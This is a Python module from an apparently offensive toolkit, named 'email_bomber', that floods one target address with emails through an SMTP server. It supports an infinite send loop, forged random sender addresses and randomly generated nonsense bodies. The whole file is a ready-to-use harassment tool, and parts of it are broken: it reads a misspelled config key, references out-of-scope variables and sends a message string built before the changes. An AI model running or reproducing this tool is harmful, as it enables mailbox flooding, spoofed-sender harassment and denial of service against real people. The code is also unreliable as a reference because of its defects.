#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import bcolors
from collections import OrderedDict
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
import random
from string import ascii_lowercase

#info about module
#modules name (must be same as filename)
modulename = "email_bomber"
#module version
version = "1.0"
#description
desc = "spam email to target email"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"


#list of variables
variables = OrderedDict((
('my_username', 'username'),
('my_password', 'yourpassword'),
('smtp', 'smtp.server.com'),
('smtp_port', 587),
('from_email', 'from@email.com'),
('to_email', 'target@email.com'),
('subject', 'hello'),
('message', 'im email bomber'),
('amount', 1),
('starttls', 0),
('login', 0),
('random_email', 1),
('random_message', 1),
))

#description for variables
vdesc = [
'username for login',
'password for login',
'smtp server',
'smtp server port(must be int)',
'from email',
'to email',
'subject',
'message',
'amount of emails(0 = infinite/must be int)',
'use starttls(0 = no/1 =yes)',
'use login(0 = no/1 = yes)',
'generate random email'
]

s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy"]
p_nouns = ["These dudes", "Both of my moms", "All the kings of the world", "Some guys", "All of a cattery's cats", "The multitude of sloths living under your bed", "Your homies", "Like, these, like, all these people", "Supermen"]
s_verbs = ["eats", "kicks", "gives", "treats", "meets with", "creates", "hacks", "configures", "spies on", "retards", "meows on", "flees from", "tries to automate", "explodes", "writes", "tease"]
p_verbs = ["eat", "kick", "give", "treat", "meet with", "create", "hack", "configure", "spy on", "retard", "meow on", "flee from", "try to automate", "explode"]
infinitives = ["to make a pie.", "for no apparent reason.", "because the sky is green.", "for a disease.", "to be able to make toast explode.", "to know more about archeology.", "because the sky is blue"]

option_notes = bcolors.YEL+" this module will not work with gmail, yahoo, yandex\n please run your own smtp!"+bcolors.END
#simple changelog
changelog = bcolors.YEL+"Version 1.0:\nrelease"+bcolors.END

def run():
	fromaddr = variables['my_username']
	toaddr = variables['to_email']
	msg = MIMEMultipart()
	msg['From'] = variables['from_email']
	msg['To'] = variables['to_email']
	msg['Subject'] = variables['subject']

	domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
	letters = ascii_lowercase[:12]

	body = variables['message']
	msg.attach(MIMEText(body, 'html'))
	try:
		server = smtplib.SMTP(variables['smtp'], int(variables['smtp_port']))
	except(ValueError):
		print(bcolors.WARNING+"error: port number must be int"+bcolors.END)
		return
	except socket.gaierror:
		print(bcolors.WARNING+"error: cannot reach smtp server"+bcolors.END)
		return
	except(ConnectionRefusedError):
		print(bcolors.WARNING+"error: connection refused"+bcolors.END)
		return
	except(TimeoutError):
		print(bcolors.WARNING+"error: timeout cannot reach smtp server"+bcolors.END)
		return
	if int(variables['starttls']) == 1:
		server.starttls()
	if int(variables['login']) == 1:
		server.login(fromaddr, variables['my_password'])
	text = msg.as_string()

	if int(variables['amount']) > 0:
		for i in range(0, int(variables['amount'])):
				if int(variables['random_email'] == 1):
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
				if int(variables['random_messagem']) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
				server.sendmail(fromaddr, toaddr, text)
				print(bcolors.OKGREEN+"email sended"+bcolors.END)

	if int(variables['amount']) == 0:
		print(bcolors.YEL+'starting infinite loop (ctrl+c) to end')
		while True:
			if int(variables['random_email']) == 1:
					fakemail = generate_random_email()
					msg['From'] = fakemail[0]
			if int(variables['random_messagem']) == 1:
					list0 = random.choice(s_nouns), random.choice(s_verbs), random.choice(s_nouns).lower() or random.choice(p_nouns).lower(), random.choice(infinitives)
					words = " ".join(list0)
					msg.attach(MIMEText(words, 'html'))
			server.sendmail(fromaddr, toaddr, text)
			print(bcolors.OKGREEN+"email sended"+bcolors.END)
	server.quit()

def get_random_domain(domains):
	return random.choice(domains)

def get_random_name(letters, length):
	return ''.join(random.choice(letters) for i in range(length))

def generate_random_email():
	return [get_random_name(letters, 8) + '@' + get_random_domain(domains) for i in range(1)]
